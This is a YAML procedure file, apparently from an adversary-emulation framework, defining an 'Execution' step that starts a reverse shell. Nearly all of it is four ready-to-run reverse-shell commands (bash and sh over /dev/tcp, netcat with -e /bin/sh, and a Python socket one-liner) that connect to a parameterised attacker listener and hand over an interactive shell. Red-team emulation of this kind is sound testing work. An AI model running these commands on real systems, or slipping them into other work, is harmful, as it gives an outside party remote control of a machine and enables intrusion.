name: Start reverse shell
description: Establish a reverse shell
tactic: Execution
techniques: ["Command and Scripting Interpreter: Unix Shell"]
# args:
#   SRC_BIN: "implant"
#   DST_BIN: "/tmp/pause"
preconditions:
  accessLevel: user-exec
  kind: System
parameters:
  LISTENER:
    type: string
    default: ${LISTENER}
    description: the URL of the listener catching the reverse shell
  LISTENER_PORT:
    type: int
    default: ${LISTENER_PORT}
    description: the listing port number
procedures:
  - key: bash
    command: bash >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1
  - key: sh
    command: sh -i >& /dev/tcp/${LISTENER}/${LISTENER_PORT} 0>&1
  - key: nc
    command: nc ${LISTENER} ${LISTENER_PORT} -e /bin/sh &
  - key: python
    command: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${LISTENER}",${LISTENER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  # exists:
  #   - Listener
# cmd: {}
# defend: {
refernces:
  - https://www.revshells.com/
